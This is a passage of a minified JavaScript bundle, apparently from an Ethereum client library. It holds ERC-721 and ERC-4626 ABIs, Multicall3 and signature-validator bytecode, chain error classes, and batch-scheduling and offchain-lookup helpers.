name:"owner",type:"address"},{indexed:!0,name:"operator",type:"address"},{indexed:!1,name:"approved",type:"bool"}]},{type:"event",name:"Transfer",inputs:[{indexed:!0,name:"from",type:"address"},{indexed:!0,name:"to",type:"address"},{indexed:!0,name:"tokenId",type:"uint256"}]},{type:"function",name:"approve",stateMutability:"payable",inputs:[{name:"spender",type:"address"},{name:"tokenId",type:"uint256"}],outputs:[]},{type:"function",name:"balanceOf",stateMutability:"view",inputs:[{name:"account",type:"address"}],outputs:[{type:"uint256"}]},{type:"function",name:"getApproved",stateMutability:"view",inputs:[{name:"tokenId",type:"uint256"}],outputs:[{type:"address"}]},{type:"function",name:"isApprovedForAll",stateMutability:"view",inputs:[{name:"owner",type:"address"},{name:"operator",type:"address"}],outputs:[{type:"bool"}]},{type:"function",name:"name",stateMutability:"view",inputs:[],outputs:[{type:"string"}]},{type:"function",name:"ownerOf",stateMutability:"view",inputs:[{name:"tokenId",type:"uint256"}],outputs:[{name:"owner",type:"address"}]},{type:"function",name:"safeTransferFrom",stateMutability:"payable",inputs:[{name:"from",type:"address"},{name:"to",type:"address"},{name:"tokenId",type:"uint256"}],outputs:[]},{type:"function",name:"safeTransferFrom",stateMutability:"nonpayable",inputs:[{name:"from",type:"address"},{name:"to",type:"address"},{name:"id",type:"uint256"},{name:"data",type:"bytes"}],outputs:[]},{type:"function",name:"setApprovalForAll",stateMutability:"nonpayable",inputs:[{name:"operator",type:"address"},{name:"approved",type:"bool"}],outputs:[]},{type:"function",name:"symbol",stateMutability:"view",inputs:[],outputs:[{type:"string"}]},{type:"function",name:"tokenByIndex",stateMutability:"view",inputs:[{name:"index",type:"uint256"}],outputs:[{type:"uint256"}]},{type:"function",name:"tokenByIndex",stateMutability:"view",inputs:[{name:"owner",type:"address"},{name:"index",type:"uint256"}],outputs:[{name:"tokenId",type:"uint256"}]},{type:"function",name:"tokenURI",stateMutability:"view",inputs:[{name:"tokenId",type:"uint256"}],outputs:[{type:"string"}]},{type:"function",name:"totalSupply",stateMutability:"view",inputs:[],outputs:[{type:"uint256"}]},{type:"function",name:"transferFrom",stateMutability:"payable",inputs:[{name:"sender",type:"address"},{name:"recipient",type:"address"},{name:"tokenId",type:"uint256"}],outputs:[]}],Qn.erc4626Abi=[{anonymous:!1,inputs:[{indexed:!0,name:"owner",type:"address"},{indexed:!0,name:"spender",type:"address"},{indexed:!1,name:"value",type:"uint256"}],name:"Approval",type:"event"},{anonymous:!1,inputs:[{indexed:!0,name:"sender",type:"address"},{indexed:!0,name:"receiver",type:"address"},{indexed:!1,name:"assets",type:"uint256"},{indexed:!1,name:"shares",type:"uint256"}],name:"Deposit",type:"event"},{anonymous:!1,inputs:[{indexed:!0,name:"from",type:"address"},{indexed:!0,name:"to",type:"address"},{indexed:!1,name:"value",type:"uint256"}],name:"Transfer",type:"event"},{anonymous:!1,inputs:[{indexed:!0,name:"sender",type:"address"},{indexed:!0,name:"receiver",type:"address"},{indexed:!0,name:"owner",type:"address"},{indexed:!1,name:"assets",type:"uint256"},{indexed:!1,name:"shares",type:"uint256"}],name:"Withdraw",type:"event"},{inputs:[{name:"owner",type:"address"},{name:"spender",type:"address"}],name:"allowance",outputs:[{type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{name:"spender",type:"address"},{name:"amount",type:"uint256"}],name:"approve",outputs:[{type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"asset",outputs:[{name:"assetTokenAddress",type:"address"}],stateMutability:"view",type:"function"},{inputs:[{name:"account",type:"address"}],name:"balanceOf",outputs:[{type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{name:"shares",type:"uint256"}],name:"convertToAssets",outputs:[{name:"assets",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{name:"assets",type:"uint256"}],name:"convertToShares",outputs:[{name:"shares",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{name:"assets",type:"uint256"},{name:"receiver",type:"address"}],name:"deposit",outputs:[{name:"shares",type:"uint256"}],stateMutability:"nonpayable",type:"function"},{inputs:[{name:"caller",type:"address"}],name:"maxDeposit",outputs:[{name:"maxAssets",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{name:"caller",type:"address"}],name:"maxMint",outputs:[{name:"maxShares",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{name:"owner",type:"address"}],name:"maxRedeem",outputs:[{name:"maxShares",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{name:"owner",type:"address"}],name:"maxWithdraw",outputs:[{name:"maxAssets",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{name:"shares",type:"uint256"},{name:"receiver",type:"address"}],name:"mint",outputs:[{name:"assets",type:"uint256"}],stateMutability:"nonpayable",type:"function"},{inputs:[{name:"assets",type:"uint256"}],name:"previewDeposit",outputs:[{name:"shares",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{name:"shares",type:"uint256"}],name:"previewMint",outputs:[{name:"assets",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{name:"shares",type:"uint256"}],name:"previewRedeem",outputs:[{name:"assets",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{name:"assets",type:"uint256"}],name:"previewWithdraw",outputs:[{name:"shares",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{name:"shares",type:"uint256"},{name:"receiver",type:"address"},{name:"owner",type:"address"}],name:"redeem",outputs:[{name:"assets",type:"uint256"}],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"totalAssets",outputs:[{name:"totalManagedAssets",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"totalSupply",outputs:[{type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{name:"to",type:"address"},{name:"amount",type:"uint256"}],name:"transfer",outputs:[{type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{name:"from",type:"address"},{name:"to",type:"address"},{name:"amount",type:"uint256"}],name:"transferFrom",outputs:[{type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{name:"assets",type:"uint256"},{name:"receiver",type:"address"},{name:"owner",type:"address"}],name:"withdraw",outputs:[{name:"shares",type:"uint256"}],stateMutability:"nonpayable",type:"function"}],Qn}var x2={},_Q;function qFe(){return _Q||(_Q=1,Object.defineProperty(x2,"__esModule",{value:!0}),x2.aggregate3Signature=void 0,x2.aggregate3Signature="0x82ad56cb"),x2}var bu={},AQ;function WA(){return AQ||(AQ=1,Object.defineProperty(bu,"__esModule",{value:!0}),bu.multicall3Bytecode=bu.erc6492SignatureValidatorByteCode=bu.deploylessCallViaFactoryBytecode=bu.deploylessCallViaBytecodeBytecode=void 0,bu.deploylessCallViaBytecodeBytecode="0x608060405234801561001057600080fd5b5060405161018e38038061018e83398101604081905261002f91610124565b6000808351602085016000f59050803b61004857600080fd5b6000808351602085016000855af16040513d6000823e81610067573d81fd5b3d81f35b634e487b7160e01b600052604160045260246000fd5b600082601f83011261009257600080fd5b81516001600160401b038111156100ab576100ab61006b565b604051601f8201601f19908116603f011681016001600160401b03811182821017156100d9576100d961006b565b6040528181528382016020018510156100f157600080fd5b60005b82811015610110576020818601810151838301820152016100f4565b506000918101602001919091529392505050565b6000806040838503121561013757600080fd5b82516001600160401b0381111561014d57600080fd5b61015985828601610081565b602085015190935090506001600160401b0381111561017757600080fd5b61018385828601610081565b915050925092905056fe",bu.deploylessCallViaFactoryBytecode="0x608060405234801561001057600080fd5b506040516102c03803806102c083398101604081905261002f916101e6565b836001600160a01b03163b6000036100e457600080836001600160a01b03168360405161005c9190610270565b6000604051808303816000865af19150503d8060008114610099576040519150601f19603f3d011682016040523d82523d6000602084013e61009e565b606091505b50915091508115806100b857506001600160a01b0386163b155b156100e1578060405163101bb98d60e01b81526004016100d8919061028c565b60405180910390fd5b50505b6000808451602086016000885af16040513d6000823e81610103573d81fd5b3d81f35b80516001600160a01b038116811461011e57600080fd5b919050565b634e487b7160e01b600052604160045260246000fd5b60005b8381101561015457818101518382015260200161013c565b50506000910152565b600082601f83011261016e57600080fd5b81516001600160401b0381111561018757610187610123565b604051601f8201601f19908116603f011681016001600160401b03811182821017156101b5576101b5610123565b6040528181528382016020018510156101cd57600080fd5b6101de826020830160208701610139565b949350505050565b600080600080608085870312156101fc57600080fd5b61020585610107565b60208601519094506001600160401b0381111561022157600080fd5b61022d8782880161015d565b93505061023c60408601610107565b60608601519092506001600160401b0381111561025857600080fd5b6102648782880161015d565b91505092959194509250565b60008251610282818460208701610139565b9190910192915050565b60208152600082518060208401526102ab816040850160208701610139565b601f01601f1916919091016040019291505056fe",bu.erc6492SignatureValidatorByteCode="0x608060405234801561001057600080fd5b5060405161069438038061069483398101604081905261002f9161051e565b600061003c848484610048565b9050806000526001601ff35b60007f64926492649264926492649264926492649264926492649264926492649264926100748361040c565b036101e7576000606080848060200190518101906100929190610577565b60405192955090935091506000906001600160a01b038516906100b69085906105dd565b6000604051808303816000865af19150503d80600081146100f3576040519150601f19603f3d011682016040523d82523d6000602084013e6100f8565b606091505b50509050876001600160a01b03163b60000361016057806101605760405162461bcd60e51b815260206004820152601e60248201527f5369676e617475726556616c696461746f723a206465706c6f796d656e74000060448201526064015b60405180910390fd5b604051630b135d3f60e11b808252906001600160a01b038a1690631626ba7e90610190908b9087906004016105f9565b602060405180830381865afa1580156101ad573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101d19190610633565b6001600160e01b03191614945050505050610405565b6001600160a01b0384163b1561027a57604051630b135d3f60e11b808252906001600160a01b03861690631626ba7e9061022790879087906004016105f9565b602060405180830381865afa158015610244573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102689190610633565b6001600160e01b031916149050610405565b81516041146102df5760405162461bcd60e51b815260206004820152603a602482015260008051602061067483398151915260448201527f3a20696e76616c6964207369676e6174757265206c656e6774680000000000006064820152608401610157565b6102e7610425565b5060208201516040808401518451859392600091859190811061030c5761030c61065d565b016020015160f81c9050601b811480159061032b57508060ff16601c14155b1561038c5760405162461bcd60e51b815260206004820152603b602482015260008051602061067483398151915260448201527f3a20696e76616c6964207369676e617475726520762076616c756500000000006064820152608401610157565b60408051600081526020810180835289905260ff83169181019190915260608101849052608081018390526001600160a01b0389169060019060a0016020604051602081039080840390855afa1580156103ea573d6000803e3d6000fd5b505050602060405103516001600160a01b0316149450505050505b9392505050565b600060208251101561041d57600080fd5b508051015190565b60405180606001604052806003906020820280368337509192915050565b6001600160a01b038116811461045857600080fd5b50565b634e487b7160e01b600052604160045260246000fd5b60005b8381101561048c578181015183820152602001610474565b50506000910152565b600082601f8301126104a657600080fd5b81516001600160401b038111156104bf576104bf61045b565b604051601f8201601f19908116603f011681016001600160401b03811182821017156104ed576104ed61045b565b60405281815283820160200185101561050557600080fd5b610516826020830160208701610471565b949350505050565b60008060006060848603121561053357600080fd5b835161053e81610443565b6020850151604086015191945092506001600160401b0381111561056157600080fd5b61056d86828701610495565b9150509250925092565b60008060006060848603121561058c57600080fd5b835161059781610443565b60208501519093506001600160401b038111156105b357600080fd5b6105bf86828701610495565b604086015190935090506001600160401b0381111561056157600080fd5b600082516105ef818460208701610471565b9190910192915050565b828152604060208201526000825180604084015261061e816060850160208701610471565b601f01601f1916919091016060019392505050565b60006020828403121561064557600080fd5b81516001600160e01b03198116811461040557600080fd5b634e487b7160e01b600052603260045260246000fdfe5369676e617475726556616c696461746f72237265636f7665725369676e6572",bu.multicall3Bytecode="0x608060405234801561001057600080fd5b506115b9806100206000396000f3fe6080604052600436106100f35760003560e01c80634d2301cc1161008a578063a8b0574e11610059578063a8b0574e14610325578063bce38bd714610350578063c3077fa914610380578063ee82ac5e146103b2576100f3565b80634d2301cc1461026257806372425d9d1461029f57806382ad56cb146102ca57806386d516e8146102fa576100f3565b80633408e470116100c65780633408e470146101af578063399542e9146101da5780633e64a6961461020c57806342cbb15c14610237576100f3565b80630f28c97d146100f8578063174dea7114610123578063252dba421461015357806327e86d6e14610184575b600080fd5b34801561010457600080fd5b5061010d6103ef565b60405161011a9190610c0a565b60405180910390f35b61013d60048036038101906101389190610c94565b6103f7565b60405161014a9190610e94565b60405180910390f35b61016d60048036038101906101689190610f0c565b610615565b60405161017b92919061101b565b60405180910390f35b34801561019057600080fd5b506101996107ab565b6040516101a69190611064565b60405180910390f35b3480156101bb57600080fd5b506101c46107b7565b6040516101d19190610c0a565b60405180910390f35b6101f460048036038101906101ef91906110ab565b6107bf565b6040516102039392919061110b565b60405180910390f35b34801561021857600080fd5b506102216107e1565b60405161022e9190610c0a565b60405180910390f35b34801561024357600080fd5b5061024c6107e9565b6040516102599190610c0a565b60405180910390f35b34801561026e57600080fd5b50610289600480360381019061028491906111a7565b6107f1565b6040516102969190610c0a565b60405180910390f35b3480156102ab57600080fd5b506102b4610812565b6040516102c19190610c0a565b60405180910390f35b6102e460048036038101906102df919061122a565b61081a565b6040516102f19190610e94565b60405180910390f35b34801561030657600080fd5b5061030f6109e4565b60405161031c9190610c0a565b60405180910390f35b34801561033157600080fd5b5061033a6109ec565b6040516103479190611286565b60405180910390f35b61036a600480360381019061036591906110ab565b6109f4565b6040516103779190610e94565b60405180910390f35b61039a60048036038101906103959190610f0c565b610ba6565b6040516103a99392919061110b565b60405180910390f35b3480156103be57600080fd5b506103d960048036038101906103d491906112cd565b610bca565b6040516103e69190611064565b60405180910390f35b600042905090565b60606000808484905090508067ffffffffffffffff81111561041c5761041b6112fa565b5b60405190808252806020026020018201604052801561045557816020015b610442610bd5565b81526020019060019003908161043a5790505b5092503660005b828110156105c957600085828151811061047957610478611329565b5b6020026020010151905087878381811061049657610495611329565b5b90506020028101906104a89190611367565b925060008360400135905080860195508360000160208101906104cb91906111a7565b73ffffffffffffffffffffffffffffffffffffffff16818580606001906104f2919061138f565b604051610500929190611431565b60006040518083038185875af1925050503d806000811461053d576040519150601f19603f3d011682016040523d82523d6000602084013e610542565b606091505b5083600001846020018290528215151515815250505081516020850135176105bc577f08c379a000000000000000000000000000000000000000000000000000000000600052602060045260176024527f4d756c746963616c6c333a2063616c6c206661696c656400000000000000000060445260846000fd5b826001019250505061045c565b5082341461060c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610603906114a7565b60405180910390fd5b50505092915050565b6000606043915060008484905090508067ffffffffffffffff81111561063e5761063d6112fa565b5b60405190808252806020026020018201604052801561067157816020015b606081526020019060019003908161065c5790505b5091503660005b828110156107a157600087878381811061069557610694611329565b5b90506020028101906106a791906114c7565b92508260000160208101906106bc91906111a7565b73ffffffffffffffffffffffffffffffffffffffff168380602001906106e2919061138f565b6040516106f0929190611431565b6000604051808303816000865af19150503d806000811461072d576040519150601f19603f3d011682016040523d82523d6000602084013e610732565b606091505b5086848151811061074657610745611329565b5b60200260200101819052819250505080610795576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161078c9061153b565b60405180910390fd5b81600101915050610678565b5050509250929050565b60006001430340905090565b600046905090565b6000806060439250434091506107d68686866109f4565b905093509350939050565b600048905090565b600043905090565b60008173ffffffffffffffffffffffffffffffffffffffff16319050919050565b600044905090565b606060008383905090508067ffffffffffffffff81111561083e5761083d6112fa565b5b60405190808252806020026020018201604052801561087757816020015b610864610bd5565b81526020019060019003908161085c5790505b5091503660005b828110156109db57600084828151811061089b5761089a611329565b5b602002602001015190508686838181106108b8576108b7611329565b5b90506020028101906108ca919061155b565b92508260000160208101906108df91906111a7565b73ffffffffffffffffffffffffffffffffffffffff16838060400190610905919061138f565b604051610913929190611431565b6000604051808303816000865af19150503d8060008114610950576040519150601f19603f3d011682016040523d82523d6000602084013e610955565b606091505b5082600001836020018290528215151515815250505080516020840135176109cf577f08c379a000000000000000000000000000000000000000000000000000000000600052602060045260176024527f4d756c746963616c6c333a2063616c6c206661696c656400000000000000000060445260646000fd5b8160010191505061087e565b50505092915050565b600045905090565b600041905090565b606060008383905090508067ffffffffffffffff811115610a1857610a176112fa565b5b604051908082528060200260200182016040528015610a5157816020015b610a3e610bd5565b815260200190600190039081610a365790505b5091503660005b82811015610b9c576000848281518110610a7557610a74611329565b5b60200260200101519050868683818110610a9257610a91611329565b5b9050602002810190610aa491906114c7565b9250826000016020810190610ab991906111a7565b73ffffffffffffffffffffffffffffffffffffffff16838060200190610adf919061138f565b604051610aed929190611431565b6000604051808303816000865af19150503d8060008114610b2a576040519150601f19603f3d011682016040523d82523d6000602084013e610b2f565b606091505b508260000183602001829052821515151581525050508715610b90578060000151610b8f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b869061153b565b60405180910390fd5b5b81600101915050610a58565b5050509392505050565b6000806060610bb7600186866107bf565b8093508194508295505050509250925092565b600081409050919050565b6040518060400160405280600015158152602001606081525090565b6000819050919050565b610c0481610bf1565b82525050565b6000602082019050610c1f6000830184610bfb565b92915050565b600080fd5b600080fd5b600080fd5b600080fd5b600080fd5b60008083601f840112610c5457610c53610c2f565b5b8235905067ffffffffffffffff811115610c7157610c70610c34565b5b602083019150836020820283011115610c8d57610c8c610c39565b5b9250929050565b60008060208385031215610cab57610caa610c25565b5b600083013567ffffffffffffffff811115610cc957610cc8610c2a565b5b610cd585828601610c3e565b92509250509250929050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b60008115159050919050565b610d2281610d0d565b82525050565b600081519050919050565b600082825260208201905092915050565b60005b83811015610d62578082015181840152602081019050610d47565b83811115610d71576000848401525b50505050565b6000601f19601f8301169050919050565b6000610d9382610d28565b610d9d8185610d33565b9350610dad818560208601610d44565b610db681610d77565b840191505092915050565b6000604083016000830151610dd96000860182610d19565b5060208301518482036020860152610df18282610d88565b9150508091505092915050565b6000610e0a8383610dc1565b905092915050565b6000602082019050919050565b6000610e2a82610ce1565b610e348185610cec565b935083602082028501610e4685610cfd565b8060005b85811015610e825784840389528151610e638582610dfe565b9450610e6e83610e12565b925060208a01995050600181019050610e4a565b50829750879550505050505092915050565b60006020820190508181036000830152610eae8184610e1f565b905092915050565b60008083601f840112610ecc57610ecb610c2f565b5b8235905067ffffffffffffffff811115610ee957610ee8610c34565b5b602083019150836020820283011115610f0557610f04610c39565b5b9250929050565b60008060208385031215610f2357610f22610c25565b5b600083013567ffffffffffffffff811115610f4157610f40610c2a565b5b610f4d85828601610eb6565b92509250509250929050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6000610f918383610d88565b905092915050565b6000602082019050919050565b6000610fb182610f59565b610fbb8185610f64565b935083602082028501610fcd85610f75565b8060005b858110156110095784840389528151610fea8582610f85565b9450610ff583610f99565b925060208a01995050600181019050610fd1565b50829750879550505050505092915050565b60006040820190506110306000830185610bfb565b81810360208301526110428184610fa6565b90509392505050565b6000819050919050565b61105e8161104b565b82525050565b60006020820190506110796000830184611055565b92915050565b61108881610d0d565b811461109357600080fd5b50565b6000813590506110a58161107f565b92915050565b6000806000604084860312156110c4576110c3610c25565b5b60006110d286828701611096565b935050602084013567ffffffffffffffff8111156110f3576110f2610c2a565b5b6110ff86828701610eb6565b92509250509250925092565b60006060820190506111206000830186610bfb565b61112d6020830185611055565b818103604083015261113f8184610e1f565b9050949350505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061117482611149565b9050919050565b61118481611169565b811461118f57600080fd5b50565b6000813590506111a18161117b565b92915050565b6000602082840312156111bd576111bc610c25565b5b60006111cb84828501611192565b91505092915050565b60008083601f8401126111ea576111e9610c2f565b5b8235905067ffffffffffffffff81111561120757611206610c34565b5b60208301915083602082028301111561122357611222610c39565b5b9250929050565b6000806020838503121561124157611240610c25565b5b600083013567ffffffffffffffff81111561125f5761125e610c2a565b5b61126b858286016111d4565b92509250509250929050565b61128081611169565b82525050565b600060208201905061129b6000830184611277565b92915050565b6112aa81610bf1565b81146112b557600080fd5b50565b6000813590506112c7816112a1565b92915050565b6000602082840312156112e3576112e2610c25565b5b60006112f1848285016112b8565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b600080fd5b600080fd5b600080fd5b60008235600160800383360303811261138357611382611358565b5b80830191505092915050565b600080833560016020038436030381126113ac576113ab611358565b5b80840192508235915067ffffffffffffffff8211156113ce576113cd61135d565b5b6020830192506001820236038313156113ea576113e9611362565b5b509250929050565b600081905092915050565b82818337600083830152505050565b600061141883856113f2565b93506114258385846113fd565b82840190509392505050565b600061143e82848661140c565b91508190509392505050565b600082825260208201905092915050565b7f4d756c746963616c6c333a2076616c7565206d69736d61746368000000000000600082015250565b6000611491601a8361144a565b915061149c8261145b565b602082019050919050565b600060208201905081810360008301526114c081611484565b9050919050565b6000823560016040038336030381126114e3576114e2611358565b5b80830191505092915050565b7f4d756c746963616c6c333a2063616c6c206661696c6564000000000000000000600082015250565b600061152560178361144a565b9150611530826114ef565b602082019050919050565b6000602082019050818103600083015261155481611518565b9050919050565b60008235600160600383360303811261157757611576611358565b5b8083019150509291505056fea264697066735822122020c1bc9aacf8e4a6507193432a895a8e77094f45a1395583f07b24e860ef06cd64736f6c634300080c0033"),bu}var ja={},CQ;function GA(){if(CQ)return ja;CQ=1,Object.defineProperty(ja,"__esModule",{value:!0}),ja.InvalidChainIdError=ja.ClientChainNotConfiguredError=ja.ChainNotFoundError=ja.ChainMismatchError=ja.ChainDoesNotSupportContract=void 0;const t=Kt();class e extends t.BaseError{constructor({blockNumber:a,chain:c,contract:l}){super(`Chain "${c.name}" does not support contract "${l.name}".`,{metaMessages:["This could be due to any of the following:",...a&&l.blockCreated&&l.blockCreated>a?[`- The contract "${l.name}" was not deployed until block ${l.blockCreated} (current block ${a}).`]:[`- The chain does not have the contract "${l.name}" configured.`]],name:"ChainDoesNotSupportContract"})}}ja.ChainDoesNotSupportContract=e;class n extends t.BaseError{constructor({chain:a,currentChainId:c}){super(`The current chain of the wallet (id: ${c}) does not match the target chain for the transaction (id: ${a.id}  ${a.name}).`,{metaMessages:[`Current Chain ID:  ${c}`,`Expected Chain ID: ${a.id}  ${a.name}`],name:"ChainMismatchError"})}}ja.ChainMismatchError=n;class r extends t.BaseError{constructor(){super(["No chain was provided to the request.","Please provide a chain with the `chain` argument on the Action, or by supplying a `chain` to WalletClient."].join(`
`),{name:"ChainNotFoundError"})}}ja.ChainNotFoundError=r;class i extends t.BaseError{constructor(){super("No chain was provided to the Client.",{name:"ClientChainNotConfiguredError"})}}ja.ClientChainNotConfiguredError=i;class s extends t.BaseError{constructor({chainId:a}){super(typeof a=="number"?`Chain ID "${a}" is invalid.`:"Chain ID is invalid.",{name:"InvalidChainIdError"})}}return ja.InvalidChainIdError=s,ja}var SC={},SQ;function KA(){if(SQ)return SC;SQ=1,Object.defineProperty(SC,"__esModule",{value:!0}),SC.encodeDeployData=i;const t=$r(),e=os(),n=Ku(),r="/docs/contract/encodeDeployData";function i(s){const{abi:o,args:a,bytecode:c}=s;if(!a||a.length===0)return c;const l=o.find(h=>"type"in h&&h.type==="constructor");if(!l)throw new t.AbiConstructorNotFoundError({docsPath:r});if(!("inputs"in l))throw new t.AbiConstructorParamsNotFoundError({docsPath:r});if(!l.inputs||l.inputs.length===0)throw new t.AbiConstructorParamsNotFoundError({docsPath:r});const f=(0,n.encodeAbiParameters)(l.inputs,a);return(0,e.concatHex)([c,f])}return SC}var TC={},TQ;function h0(){if(TQ)return TC;TQ=1,Object.defineProperty(TC,"__esModule",{value:!0}),TC.getChainContractAddress=e;const t=GA();function e({blockNumber:n,chain:r,contract:i}){const s=r?.contracts?.[i];if(!s)throw new t.ChainDoesNotSupportContract({chain:r,contract:{name:i}});if(n&&s.blockCreated&&s.blockCreated>n)throw new t.ChainDoesNotSupportContract({blockNumber:n,chain:r,contract:{name:i,blockCreated:s.blockCreated}});return s.address}return TC}var xC={},xQ;function tM(){if(xQ)return xC;xQ=1,Object.defineProperty(xC,"__esModule",{value:!0}),xC.getCallError=r;const t=o0(),e=Jf(),n=LA();function r(i,{docsPath:s,...o}){const a=(()=>{const c=(0,n.getNodeError)(i,o);return c instanceof e.UnknownNodeError?i:c})();return new t.CallExecutionError(a,{docsPath:s,...o})}return xC}var IC={},RC={},IQ;function nM(){if(IQ)return RC;IQ=1,Object.defineProperty(RC,"__esModule",{value:!0}),RC.withResolvers=t;function t(){let e=()=>{},n=()=>{};return{promise:new Promise((i,s)=>{e=i,n=s}),resolve:e,reject:n}}return RC}var RQ;function rM(){if(RQ)return IC;RQ=1,Object.defineProperty(IC,"__esModule",{value:!0}),IC.createBatchScheduler=n;const t=nM(),e=new Map;function n({fn:r,id:i,shouldSplitBatch:s,wait:o=0,sort:a}){const c=async()=>{const b=h();l();const w=b.map(({args:y})=>y);w.length!==0&&r(w).then(y=>{a&&Array.isArray(y)&&y.sort(a);for(let E=0;E<b.length;E++){const{resolve:A}=b[E];A?.([y[E],y])}}).catch(y=>{for(let E=0;E<b.length;E++){const{reject:A}=b[E];A?.(y)}})},l=()=>e.delete(i),f=()=>h().map(({args:b})=>b),h=()=>e.get(i)||[],m=b=>e.set(i,[...h(),b]);return{flush:l,async schedule(b){const{promise:w,resolve:y,reject:E}=(0,t.withResolvers)();return s?.([...f(),b])&&c(),h().length>0?(m({args:b,resolve:y,reject:E}),w):(m({args:b,resolve:y,reject:E}),setTimeout(c,o),w)}}}return IC}var tk={},nf={},PQ;function VFe(){if(PQ)return nf;PQ=1,Object.defineProperty(nf,"__esModule",{value:!0}),nf.OffchainLookupSenderMismatchError=nf.OffchainLookupResponseMalformedError=nf.OffchainLookupError=void 0;const t=Ns(),e=Kt(),n=Hj();class r extends e.BaseError{constructor({callbackSelector:a,cause:c,data:l,extraData:f,sender:h,urls:m}){super(c.shortMessage||"An error occurred while fetching for an offchain result.",{cause:c,metaMessages:[...c.metaMessages||[],c.metaMessages?.length?"":[],"Offchain Gateway Call:",m&&["  Gateway URL(s):",...m.map(b=>`    ${(0,n.getUrl)(b)}`)],`  Sender: ${h}`,`  Data: ${l}`,`  Callback selector: ${a}`,`  Extra data: ${f}`].flat(),name:"OffchainLookupError"})}}nf.OffchainLookupError=r;class i extends e.BaseError{constructor({result:a,url:c}){super("Offchain gateway response is malformed. Response data must be a hex value.",{metaMessages:[`Gateway URL: ${(0,n.getUrl)(c)}`,`Response: ${(0,t.stringify)(a)}`],name:"OffchainLookupResponseMalformedError"})}}nf.OffchainLookupResponseMalformedError=i;class s extends e.BaseError{constructor({sender:a,to:c}){super("Reverted sender address does not match target contract address (`to`).",{metaMessages:[`Contract address: ${c}`,`OffchainLookup sender address: ${a}`],name:"OffchainLookupSenderMismatchError"})}}return nf.OffchainLookupSenderMismatchError=s,nf}var nk={},PC={},NQ;function iM(){if(NQ)return PC;NQ=1,Object.defineProperty(PC,"__esModule",{value:!0}),PC.decodeFunctionData=s;const t=$r(),e=Jc(),n=sy(),r=s0(),i=Zf();function s(o){const{abi:a,data:c}=o,l=(0,e.slice)(c,0,4),f=a.find(h=>h.type==="function"&&l===(0,n.toFunctionSelector)((0,i.formatAbiItem)(h)));if(!f)throw new t.AbiFunctionSignatureNotFoundError(l,{docsPath:"/docs/contract/decodeFunctionData"});return{functionName:f.name,args:"inputs"in f&&f.inputs&&f.inputs.length>0?(0,r.decodeAbiParameters)(f.inputs,(0,e.slice)(c,4)):void 0}}return PC}var NC={},OQ;function sM(){if(OQ)return NC;OQ=1,Object.defineProperty(NC,"__esModule",{value:!0}),NC.encodeErrorResult=a;const t=$r(),e=os(),n=sy(),r=Ku(),i=Zf(),s=Qf(),o="/docs/contract/encodeErrorResult";function a(c){const{abi:l,errorName:f,args:h}=c;let m=l[0];if(f){const E=(0,s.getAbiItem)({abi:l,args:h,name:f});if(!E)throw new t.AbiErrorNotFoundError(f,{docsPath:o});m=E}if(m.type!=="error")throw new t.AbiErrorNotFoundError(void 0,{docsPath:o});const b=(0,i.formatAbiItem)(m),w=(0,n.toFunctionSelector)(b);let y="0x";if(h&&h.length>0){if(!m.inputs)throw new t.AbiErrorInputsNotFoundError(m.name,{docsPath:o});y=(0,r.encodeAbiParameters)(m.inputs,h)}return(0,e.concatHex)([w,y])}return NC}var OC={},kQ;function oM(){if(kQ)return OC;kQ=1,Object.defineProperty(OC,"__esModule",{value:!0}),OC.encodeFunctionResult=i;const t=$r(),e=Ku(),n=Qf(),r="/docs/contract/encodeFunctionResult";function i(s){const{abi:o,functionName:a,result:c}=s;let l=o[0];if(a){const h=(0,n.getAbiItem)({abi:o,name:a});if(!h)throw new t.AbiFunctionNotFoundError(a,{docsPath:r});l=h}if(l.type!=="function")throw new t.AbiFunctionNotFoundError(void 0,{docsPath:r});if(!l.outputs)throw new t.AbiFunctionOutputsNotFoundError(l.name,{docsPath:r});const f=(()=>{if(l.outputs.length===0)return[];if(l.outputs.length===1)return[c];if(Array.isArray(c))return c;throw new t.InvalidArrayError(c)})();return(0,e.encodeAbiParameters)(l.outputs,f)}return OC}var DQ;function Q8(){return DQ||(DQ=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.localBatchGatewayUrl=void 0,t.localBatchGatewayRequest=o;const e=f0(),n=Lj(),r=iM(),i=sM(),s=oM();t.localBatchGatewayUrl="x-batch-gateway:true";async function o(c){const{data:l,ccipRequest:f}=c,{args:[h]}=(0,r.decodeFunctionData)({abi:e.batchGatewayAbi,data:l}),m=[],b=[];return await Promise.all(h.map(async(w,y)=>{try{b[y]=w.urls.includes(t.localBatchGatewayUrl)?await o({data:w.data,ccipRequest:f}):await f(w),m[y]=!1}catch(E){m[y]=!0,b[y]=a(E)}})),(0,s.encodeFunctionResult)({abi:e.batchGatewayAbi,functionName:"query",result:[m,b]})}function a(c){return 